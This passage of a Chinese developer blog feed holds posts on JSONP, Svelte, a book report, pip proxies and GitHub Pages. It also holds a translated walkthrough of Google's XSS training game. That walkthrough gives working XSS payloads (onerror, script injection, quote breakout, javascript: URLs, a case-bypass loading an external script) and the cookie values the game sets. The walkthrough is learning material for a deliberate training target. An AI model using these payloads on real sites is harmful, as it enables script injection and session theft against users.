class="line">app.listen(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;start at port:&#x27;</span>,port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>  首先说明一下原理: 通过js构造一个script标签,把要请求的url放在script的src中.</p>
<p>  构造页面,点击jsonp标签发起请求.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;get()&quot;</span>&gt;</span>jsonp<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;id&#x27;</span> <span class="attr">style</span>=<span class="string">&quot;border:1px solid red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  js代码<br>  为了演示方便,定义一个id.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">idPlus</span>(<span class="params"></span>)</span>&#123; <span class="comment">// 返回一个闭包</span></span><br><span class="line">  <span class="keyword">var</span> id = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> id = idPlus(); <span class="comment">// 为了演示方便增加一个自增的id</span></span><br></pre></td></tr></table></figure>
<p>创建一个函数,监听html中的事件.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  jsonp(<span class="string">&#x27;http://127.0.0.1:3000/jsonp/&#x27;</span>+id(), </span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>].innerHTML = value;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是实际封装的jsonp函数.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://127.0.0.1:3000/jsonp/&#x27;</span>+(id());</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, jsonpCallback, success</span>)</span>&#123;</span><br><span class="line">  url = <span class="string">&quot;&quot;</span>+url+<span class="string">&quot;?callback=&quot;</span>+jsonpCallback; <span class="comment">// 对url进行处理,加上callback</span></span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.src = url;</span><br><span class="line">  script.className=<span class="string">&quot;jsonp-script&quot;</span></span><br><span class="line">  <span class="built_in">window</span>[jsonpCallback] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">//将callback加入到window对象中</span></span><br><span class="line">    success &amp;&amp; success(data)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>可以看到此时可以正常访问.<br>当然这段代码还有一个缺点, 每次发起请求的script标签一直存在.可以再回调函数中将script标签删除:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;jsonp-script&#x27;</span>)[<span class="number">0</span>].parentElement.removeChild(<span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;jsonp-script&#x27;</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p><img src="jsonp1.gif"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于这些基础的概念, 虽然看文章可以看到,也知道大概的意思.但, 还是要经过代码的检验,才能彻底弄清楚.比如,一直知道前端组装一个script标签可以发起请求, 但是具体如何拿到数据,这个步骤一直没有弄清楚.所以, 纸上得来终觉浅,绝知此事要躬行.<br>另外,还有一些问题:</p>
<ul>
<li>为什么获取script标签只能用get请求?</li>
<li>获取标签的get请求与ajax的get请求有什么不同?</li>
<li>ajax与fetch有什么不同?</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>主要代码来自这里: <a href="https://yuchengkai.cn/docs/zh/frontend/browser.html#jsonp">https://yuchengkai.cn/docs/zh/frontend/browser.html#jsonp</a></li>
<li>这篇文章解开了我如何获取数据的疑惑: <a href="https://www.cnblogs.com/chiangchou/p/jsonp.html">https://www.cnblogs.com/chiangchou/p/jsonp.html</a></li>
<li>本文源码: <a href="https://github.com/tbswang/resources/tree/master/blog/jsonp">https://github.com/tbswang/resources/tree/master/blog/jsonp</a></li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>google xss game 通关攻略</title>
    <url>/2019/01/12/google-xss-game/</url>
    <content><![CDATA[<!-- # google的xss游戏通关攻略 -->
<h2 id="『第一关』"><a href="#『第一关』" class="headerlink" title="『第一关』"></a><a href="https://xss-game.appspot.com/level1">『第一关』</a></h2><p>第一关是个非常脆弱的反射性xss攻击。向url或者form表单中注入xss代码都可以实现攻击。把下面的俩例子粘贴到表单中，点击搜索按钮：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>如果把上面的俩例子注入到url中，点击go按钮（这个按钮是这个假浏览器的一部分），攻击可以生效。唯一的限制就是，如果拼接到url后面代码中包含一个分号，是不会起作用的。上面的第二个例子中，也可以省略分号，因为这script脚本只有一行。</p>
<p>但是，如果把分号用url编码成<code>%3B</code>,然后注入到url中，也可以攻击生效。注意，还需要在攻击代码之前添加<code>?query=</code>。因此就是连接下面三个片段：</p>
<ol>
<li><code>https://xss-game.appspot.com/level1/frame</code></li>
<li><code>?query=</code></li>
<li><code>&lt;script&gt;alert(&quot;xss&quot;)%3B&lt;/script&gt;</code></li>
</ol>
<p>那么完整的url就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level1&#x2F;frame?query&#x3D;&lt;script&gt;alert(&quot;xss&quot;)%3B&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="『第二关』"><a href="#『第二关』" class="headerlink" title="『第二关』"></a><a href="https://xss-game.appspot.com/level2">『第二关』</a></h2><p>第二关是一个关于存储型的xss攻击。这一关的做了一些过滤，防止你直接注入<code>script</code>标签。但是img标签是可以用的。而img标签允许可以添加一些监听函数（比如可以增加<code>onerror</code>），这里面是包含js代码的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>一旦攻击代码通过表单提交，每次载入这个页面，我们的js代码就可以在用户的浏览器运行–或者任何人–只要他们访问了这个网页。这也是为什么存储型的xss比反射性的危害更大。</p>
<p>我没有找到一个直接向url中注入代码的方法。</p>
<h2 id="『第三关』"><a href="#『第三关』" class="headerlink" title="『第三关』"></a><a href="https://xss-game.appspot.com/level3">『第三关』</a></h2><p>为了通过第三关，我只能使用Safari (10.0.3)，因为Firefox (51.0.1) and Chrome (55.0.2883.95)都阻止向url中注入一个空格，不管有没有进行url编码。我用下面的url在safari中成功通过第三关。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level3&#x2F;frame&#39; onerror&#x3D;&quot;alert(&#39;xss&#39;)&quot;</span><br></pre></td></tr></table></figure>
<p>但我还是想用firefox通过。所以我拷贝了safari中叫做level3的cookie。我做了一下的步骤：</p>
<ol>
<li>我设置safari使用Burp proxy。</li>
<li>我用上面的方法通过第一关和第二关。</li>
<li>我用上面的添加了攻击代码的url访问访问第三关。当alert()弹出的时候，游戏就会设置一个叫做level3的cookie。</li>
<li>我复制了这三个cookie <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x3D;f148716ef4ed1ba0f192cde4618f8dc5; level2&#x3D;b5e530302374aa71cc3028c810b63641; level3&#x3D;d5ce029d0680b3816a349da0d055fcfa;</span><br></pre></td></tr></table></figure>
下面的代码是如何在火狐和chrome的开发者工具的console窗口设置新的cookie<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;level3&#x3D;d5ce029d0680b3816a349da0d055fcfa&quot;;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>现在就可以在火狐或者Chrome中进入下一关。不像那个由这个游戏设置的cookie，我们自己手动设置的cookie在此次回话结束后就过期。所以，如果你现在关闭<code>xss- game.appspot.com</code>的标签页，再重新打开这个网页，就会发现无法到第四关。这是因为第三关的cookie在刚才回话结束后就失效了。因此，最好的办法是手动给cookie设置过期时间的<code>expire</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;level3&#x3D;d5ce029d0680b3816a349da0d055fcfa;expires&#x3D;&#39; Fri, 22 July 2022 5:34:56 GMT&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>也可以像这样设置cookie的其他属性，这里关于<code>document.cookie</code><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie">说明</a>非常详细。</p>
<p>组装img的代码， 如果我使用单引号提前截断，就可以注入<br><a href="https://xss-game.appspot.com/level3/frame#1&#39;">https://xss-game.appspot.com/level3/frame#1&#39;</a> onerror=”alert(1)”/&gt;</p>
<h2 id="『第四关』"><a href="#『第四关』" class="headerlink" title="『第四关』"></a>『第四关』</h2><p>我没做出来。我谷歌了一些答案，但是并没有得到预期的结果。最终，我发现，在这三个浏览器中，如果你把下面的字符串输入到表单中，然后点击「create button」按钮，它是可以生效的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();var b&#x3D;(&#39;</span><br></pre></td></tr></table></figure>

<p>但是，要想直接注入url中使攻击生效，你必须对攻击的字符串进行url编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%27%29%3Balert%28%29%3Bvar+b%3D%28%27</span><br></pre></td></tr></table></figure>

<p>有很多网站可以替你做这些。但是他们有bug，不可信。最近，我开始使用一个在python2.7在默认包含的方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> urllib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = <span class="string">&quot;&#x27;);alert();var b=(&#x27;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urllib.quote_plus(foo)</span><br><span class="line"><span class="string">&#x27;%27%29%3Balert%28%29%3Bvar+b%3D%28%27&#x27;</span></span><br></pre></td></tr></table></figure>

<p>记住，在变量的赋值中，用双引号包裹攻击字符串。也不要忘记，移除python在输出结果外边的单引号。在python3中有轻微的不同。我在StackExchange.com的一个<a href="http://stackoverflow.com/a/9345102">答案</a>中学到了这个。</p>
<p>与第一关中的url拼接类似，我们需要向攻击的字符串中添加合适的变量名，以及在变量名之前添加<code>?</code>和变量名之后添加<code>=</code>。也就是说连接下面的几个部分:</p>
<ol>
<li><code>https://xss-game.appspot.com/level4/frame</code></li>
<li><code>?timer=</code></li>
<li><code>%27%29%3Balert%28%29%3Bvar+b%3D%28%27</code></li>
</ol>
<p>这样可以得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level4&#x2F;frame?timer&#x3D;%27%29%3Balert%28%29%3Bvar+b%3D%28%27</span><br></pre></td></tr></table></figure>

<p>然后点击这个假的浏览器中的『go』按钮。</p>
<h2 id="『第五关』"><a href="#『第五关』" class="headerlink" title="『第五关』"></a><a href="https://xss-game.appspot.com/level5">『第五关』</a></h2><p><br>为了通过这一关，需要按照以下的步骤：</p>
<ol>
<li><p>点击『sign up』链接。</p>
</li>
<li><p>在下一页，url会变成这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;signup?next&#x3D;confirm</span><br></pre></td></tr></table></figure>

<p>在url中把<code>next</code>的值从<code>confirm</code>变成<code>javascript:alert(1)</code>。</p>
</li>
<li><p>点击假浏览器中的『go』按钮。点击这个按钮可以改变『Next &gt;&gt;』的<code>href</code>连接的地址。在点击『go』按钮之前，如果把鼠标悬浮到『Next &gt;&gt;』上，目标地址是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;confirm</span><br></pre></td></tr></table></figure>

<p>实际中，<code>href</code>的值相对路径连接，只是一个『confirm』。当把『confirm』变成<code>javascript:alert(1)</code>，url就被设置为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;signup?next&#x3D;javascript:alert(1)</span><br></pre></td></tr></table></figure>

<p>此时，点击『go』按钮，把鼠标悬浮到『Next &gt;&gt;』上，目标地址是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>

<p>用户手动编辑了url后，『href』的链接就变成用户的输入。</p>
</li>
<li><p>点击『Next &gt;&gt;』链接，会显示一个弹出框，这个游戏会设置一个新的cookie，显示一个信息框，提示说你可以进入下一关。</p>
</li>
</ol>
<p>我认为这个课程是说如果你不能注入标签，你也可以注入在真实的资源标识符前面添加<code>javascript:</code> 。我不得不点击所有四个提示，直到我按照提示4的连接<a href="https://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-00">this IETF draft</a></p>
<h2 id="『第六关』"><a href="#『第六关』" class="headerlink" title="『第六关』"></a><a href="https://xss-game.appspot.com/level6">『第六关』</a></h2><p>对于第六关，我得好好找找答案。实际上，这是一个客户端自定义的正则表达式的匹配过滤，这个过滤大小写敏感，过滤掉<code>http</code> or <code>https</code>开头的url。所以，一下是一个成功的url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level6&#x2F;frame#HTTPS:&#x2F;&#x2F;xss.rocks&#x2F;xss.js</span><br></pre></td></tr></table></figure>

<p>我用了一个<a href="http://xss.rocks/">xss.rocks</a>无害的js文件</p>
<p>我没有猜答案。我查看了源代码，看到在接下来的函数中阻止我注入<code>http</code>或者<code>https</code>.我也没把正则表达式拿来测试。我在 w3scholl.com <a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_match_regexp2">“Try It” page</a>测试js<br>字符串的match()方法.</p>
<p>这个函数可以再源代码的57行看到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This will totally prevent us from loading evil URLs!</span></span><br><span class="line"><span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">  setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">    <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的正则<code>/^https?:\/\//</code>可以匹配<code>http</code>或者<code>https</code>。如果开发者增加了i标记，这个正则就可以匹配大写或者小写。大小写不敏感的正则是<code>/^https?:\/\//i</code>。</p>
<p>我猜这一关的课主要是告诉你，应该浏览所有的源代码，看看开发者是不是写了客户端过滤的代码，看看他们是不是也犯错误。</p>
]]></content>
      <tags>
        <tag>翻译</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>『构建之道』的读书报告</title>
    <url>/2019/02/24/%E3%80%8E%E6%9E%84%E5%BB%BA%E4%B9%8B%E9%81%93%E3%80%8F%E7%9A%84%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h1 id="本书的简单介绍"><a href="#本书的简单介绍" class="headerlink" title="本书的简单介绍"></a>本书的简单介绍</h1><p>最近十多年来，软件产业和互联网产业的迅猛发展，给众多计算机和软件专业的学生们提供了用武之地，同时也对大学软件工程的教育提出了很大的挑战。经典的软件工程理论和模式虽然仍有其价值，但是国外的教师和业界人士一直在探索新的理论和最佳实践。『构建之道』的作者是微软亚洲研究院的邹欣，在总结了自己的『做中学』的教学思想，在经过在清华，北航等学校的教学实践之后，总结出的这本书。</p>
<p>与学校里面一些传统的软件工程理论课程不同，这本书注重教学与实践的结合。并且特别注意和现在公司的工程实践结合。一本开始学习软件工程，可能是按照经典的瀑布模型，从需求分析，架构设计，系统实现，再到测试，以及最后的发布，和维护。这是一个正常的软件生命周期过程。但是在学生踏入职场的时候，最可能接触的并不是这些。可能先是维护一些现有的模块，修改小的bug，测试，重构，然后上线。然后逐渐接触大的模块，设计，实现，测试，上线。最后，等到一个学生，真正蜕变为一个合格的员工，才可能按照瀑布模型经历一次软件开发过程。这种从瀑布尽头一步一步上溯到源头，然后从源头流下去的模型，可以成为大马哈鱼模型。</p>
<a id="more"></a>
<h1 id="本书的主要内容"><a href="#本书的主要内容" class="headerlink" title="本书的主要内容"></a>本书的主要内容</h1><p>本书的目录结构编排非常有意思。从之前提到的大马哈鱼洄游模型可以看到，一开始接触到的软件开发，并不是一泻千里的瀑布模型，而是只有自己的。所以一上来，就是从一个软件开发者的角度切入：个人技术，软件工程师的成长。然后才是逐渐扩展，四五章将的就是从小范围与其他软件开发者交流，比如结对编程，代码复审，到整个团队的建设，结构。然后才是需求分析，软件的设计与实现，软件的质量保证，最后是发布。中间穿插了项目经理是什么，敏捷开发流程，与终端用户相关的用户体验，已经对整个IT行业的思考，最后则是作者在实际中碰到的，比如如何评估绩效，软件工程师的道德观念等实际存在，但是教科书中一般不会提及的内容。</p>
<p>这里主要记录我在阅读过程中遇到的比较有感触的地方。</p>
<h2 id="关于『1-1-软件-程序-软件工程』"><a href="#关于『1-1-软件-程序-软件工程』" class="headerlink" title="关于『1.1　软件=程序+软件工程』"></a>关于『1.1　软件=程序+软件工程』</h2><p>从数据结构的第一课，我们就听说『程序=数据结构+算法』，但是，我们自己在学校中写出的小小的代码，与公司中的产出代码非常不同。而且我们自己写的代码，也几乎没有信心放到生产环境中调试。这应该是一个软件专业学生和一个软件工程师很大的不同。</p>
<p>作者提出的这个观点，软件其实，按照软件工程的流程实现的代码。与自己在学校随心所欲的代码不同。这是符合工程化的代码。</p>
<p>另外，更大一步，商业模式决定了一个软件公司的成败，软件企业=软件+商业模式。</p>
<p>从我们底层的角度，微软的操作系统+贩卖授权的模式，成就了微软。qq，免费使用，但是一些更高级的功能，需要额外收费；一些开源软件，个人可以免费使用，但是公司使用需要授权，比如docker。所以，一个公司的成功，很大一方面和公司的商业模式有关系。</p>
<h2 id="关于『2-2效能分析工具』"><a href="#关于『2-2效能分析工具』" class="headerlink" title="关于『2.2效能分析工具』"></a>关于『2.2效能分析工具』</h2><p>作为一个以前端开发为生的程序猿，性能是一个羞于启齿，不愿谈论的话题。我觉得主要有这几个方面：</p>
<ul>
<li>js作为一个弱类型的、解释性的语言，就是慢。</li>
<li>js就是一个在浏览器中负责点击表单，显示对话框的脚本语言，不需要多么强的性能。</li>
<li>nodejs不是前端的吗？（by 后端同学）</li>
</ul>
<p>这一节的书中以一个词汇频率计数的代码为例子，使用抽样（Sampling）或者代码注入（Instrumentation）两种方式，分析程序的调用栈，计算每个函数的运行时间和调用次数。比如这个例子<img src="analize.png"></p>
<p>在Chrome的devTools中也有火焰图，可以实现类似的功能，查看函数的消耗时间比例。对于页面来说，还可以查看画面的帧数。</p>
<h2 id="关于『3-2软件工程师的职业发展』"><a href="#关于『3-2软件工程师的职业发展』" class="headerlink" title="关于『3.2软件工程师的职业发展』"></a>关于『3.2软件工程师的职业发展』</h2><p>很多对于软件工程师的职级评价，就前端而言，干过三年，就可以号称高级。我觉得这个表格是值得参考的。<br><img src="%E8%81%8C%E7%BA%A7.png"></p>
<h1 id="个人感悟和总结"><a href="#个人感悟和总结" class="headerlink" title="个人感悟和总结"></a>个人感悟和总结</h1><p>作为一个开发软件的人，不能只是学会写代码，还要有一点世界的认知。对于软件工程的理解，这是随着不断的工作深入的。虽然是，软件工程没有『银弹』，但是总会有不断进步的技术出现，使得软件工程不断发展。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="http://www.cnblogs.com/xinz">『构建之道』作者的博客</a></p>
]]></content>
      <categories>
        <category>软件工程</category>
      </categories>
  </entry>
  <entry>
    <title>svelte初探</title>
    <url>/2019/05/26/svelte%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h1><p>web前端轮子越来越多,最近发现一个好玩的,叫做svelte.本文主要介绍了svelte的特点,尝试解释其中的原理,与vue做了比较.</p>
<a id="more"></a>
<p><img src="svelte-title.png"></p>
<h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>web前端的技术迭代很快,各种轮子层出不穷.目前的处于统治地位的var(vue,react,angular),主要有使用组件化、虚拟dom等技术,在生产环境中会加载框架的运行时代码.而且,前端技术的发展,各种各样的轮子层出不穷,甚至有一个vanilla.js的框架出现,专门嘲讽目前的这种风气.</p>
<p>svelte也是一个轮子,他最吸引我的地方在于将自己定位为一个编译器,在编译阶段将代码转换为原生的js, 而且放弃了虚拟dom.在响应式方面, 自己做了更多的工作,我的感受是默认的变量都是响应式的.</p>
<h1 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h1><p>本部分主要来自官方的tutorial的总结.花了一天时间跑了所有的例子,有些感想一起放在下面.</p>
<h2 id="初感受"><a href="#初感受" class="headerlink" title="初感受"></a>初感受</h2><ul>
<li>{}绑定数据,包括html标签中的属性绑定<br>没有vue中引入的template和react的jsx的语法,一切与原生写法都很类似.数据默认就是响应式的,在html中直接使用{}就可以拿到js中定义的数据.当然数据的作用范围是在组件内.{}类似模版的语法,可以执行一些简单的js逻辑.这一部分还是比较符合现在的潮流.</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">let</span> name = <span class="string">&#x27;world&#x27;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;name.toUpperCase()&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="响应式"><a href="#响应式" class="headerlink" title="响应式"></a>响应式</h2><ul>
<li>默认响应式<br>默认的变量都是响应式的,通过{}获取的数值会自动更新</li>
<li>更简单的computed<br>使用$就可以<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$: if (count &gt;&#x3D; 10) &#123;</span><br><span class="line">  alert(&#96;count is dangerously high!&#96;);</span><br><span class="line">  count &#x3D; 9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
比如将上面看作在一个函数中,和vue就几乎没什么区别.(笑哭)</li>
<li>只有赋值才会引起数据响应式<br>这是个比较蛋疼的地方.特别的对于数组或者对象,改变了其中一个元素或者属性,并不会引起数据的响应式变化.官方的例子中给出了<code>numbers = [...numbers, numbers.length + 1];</code>这样强行赋值的写法.但是不符合常理.搜索一圈git发现果然已经有人给出了方法的封装(<a href="https://github.com/dasmikko/svelte-array-helper">https://github.com/dasmikko/svelte-array-helper</a>).<br>应该是svelte处于性能的考虑, 只对对象的引用(指针)做了比较.</li>
</ul>
<h2 id="子组件传值"><a href="#子组件传值" class="headerlink" title="子组件传值"></a>子组件传值</h2><p>这里是第一个不太适应的地方,在子组件中,通过export自己的属性名字,在父组件中拿到这个名字,然后传值.这样是将子组件暴露给父组件,这样貌似没有props传值更加让人舒服.</p>
<p>数据流向也是top-down.父组件修改后会引起子组件的重新渲染,反之不会.</p>
<h2 id="更加贴近模板的语法"><a href="#更加贴近模板的语法" class="headerlink" title="更加贴近模板的语法"></a>更加贴近模板的语法</h2><p>如果使用过html模板,对这一部分应该挺熟悉.比如下面:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;#if user.loggedIn&#125;</span><br><span class="line">	&lt;button on:click&#x3D;&#123;toggle&#125;&gt;</span><br><span class="line">		Log out</span><br><span class="line">	&lt;&#x2F;button&gt;</span><br><span class="line">&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>
<p>简直就是v-if的翻版.只能说, 真香!</p>
<h2 id="事件和vue更像"><a href="#事件和vue更像" class="headerlink" title="事件和vue更像"></a>事件和vue更像</h2><p>只能说这种语法和许多框架大同小异.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button on:click|once&#x3D;&#123;handleClick&#125;&gt;</span><br><span class="line">	Click me</span><br><span class="line">&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>
<p>通过on绑定事件,然后添加once的限制.和vue中添加“.”的语法简直一模一样嘛.</p>
<h2 id="组件的生命周期"><a href="#组件的生命周期" class="headerlink" title="组件的生命周期"></a>组件的生命周期</h2><p>有四个钩子函数,分别对应创建,销毁,更新前,更新后</p>
<h2 id="动画和样式"><a href="#动画和样式" class="headerlink" title="动画和样式"></a>动画和样式</h2><p>这个是svelte自己实现的一些语法糖.语法有点怪怪的.个人感觉还是原生的css写的更方便.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来想写一个详细入门攻略, 结果变成一个tutorial的个人记录.</p>
<h1 id="之后"><a href="#之后" class="headerlink" title="之后"></a>之后</h1><p>svelte确实是一个与var思路不同的轮子.</p>
<p>对于他的生态,官方给出了一个sapper的框架,集合了路由的功能.对国内使用,还需要一个通用的组件库,类似antd和element.</p>
<p>用的人比较少,踩的坑比较少.</p>
<p>另外, 希望能够支持typescript.官方说了会支持, 但是不知道什么时候.</p>
<p>对于vue的底层原理了解不透彻,所以也无法从更深层次比较两个轮子.之后还会继续关注这个(又挖了一个坑…)</p>
<p>另外,svelte默认用rollup打包,本着折腾的思路,用rollup打包了vue的项目,比较一下打包之后的文件.这个留在之后再说.</p>
]]></content>
  </entry>
  <entry>
    <title>pip设置代理</title>
    <url>/2019/06/12/pip-proxy/</url>
    <content><![CDATA[<h2 id="pip代理"><a href="#pip代理" class="headerlink" title="pip代理"></a>pip代理</h2><p>pip是python的包管理工具.由于某些原因, 会导致下载的包过慢或者无法下载.</p>
<p>如何让pip走本地的代理进行下载呢, 下面给出两种情况.</p>
<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>在自己的电脑搭建了ss代理</p>
<h3 id="未使用sudo"><a href="#未使用sudo" class="headerlink" title="未使用sudo"></a>未使用sudo</h3><p>一般情况(没有sudo),使用ss+proxifier可以直接走代理,具体速度可以在proxifer中查看</p>
<h3 id="显示指定proxy"><a href="#显示指定proxy" class="headerlink" title="显示指定proxy"></a>显示指定proxy</h3><p>命令如此<code>pip3 --proxy 127.0.0.1:&lt;本地http代理的端口&gt; install &lt;包的名字&gt;</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.logcg.com/archives/1914.html">https://www.logcg.com/archives/1914.html</a></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>github pages使用简介</title>
    <url>/2019/07/16/github-pages-introduction/</url>
    <content><![CDATA[<p>使用github托管代码，有时候需要展示一个简单的demo页面，如果专门为此维护一个demo网页，成本有点高，而且demo和代码分离，也不利于查阅。幸好github推出了一个github pages的服务。</p>
<a id="more"></a>
<h2 id="啥是github-pages"><a href="#啥是github-pages" class="headerlink" title="啥是github pages"></a>啥是github pages</h2><p>官方介绍中，GitHub pages是一个静态网页托管服务。说白了，就是github给我们分配一个域名，将我们代码库中的文件作为一个静态文件，我们就可以通过http访问。</p>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>使用非常简单。可以选择发布master分支或者gh-pages分支。</p>
<ol>
<li>在仓库中选择setting</li>
</ol>
<p><img src="./Untitled-431b3498-2d7a-41c5-b502-dd3f414375a0.png"></p>
<ol start="2">
<li>在github pages部分选择master或者gh-pages分支，之后页面中会提示可以访问的地址。除此之外，还可以选择master分支下的docs跟目录作为托管的目录。道理都是相通的。</li>
</ol>
<p><img src="./Untitled-c2e4692b-a9da-496e-8bc1-063295600b1b.png"></p>
<ol start="3">
